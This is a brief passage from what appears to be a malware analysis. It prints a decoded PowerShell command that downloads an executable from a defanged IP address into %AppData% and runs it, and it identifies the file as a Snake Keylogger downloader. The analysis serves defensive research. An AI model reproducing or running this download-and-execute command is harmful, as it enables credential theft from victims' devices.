Below is the base64-decoded PowerShell code: $ProcName = \"Wheahmnfpgaqse.exe\"; (New-Object System.
Net.
WebClient).
DownloadFile (\"hxxp[:]//3[.]64[.]251[.]139/v3/2/Requests07520000652.exe\",\"$env:APPDATA\\$ProcName\"); Start-Process (\"$env:APPDATA\\$ProcName\")
The PowerShell code is very simple and easy to understand.
It downloads a file (“Requests07520000652.exe”) onto a victim’s device, places it at “%AppData%\\Wheahmnfpgaqse.exe\" by calling “DownloadFile()”, and executes it by calling “Start-Process()”.
Snake Keylogger Downloader After some research, I learned that the file \"Wheahmnfpgaqse.exe\" is a downloader of Snake Keylogger, which is a .Net program.
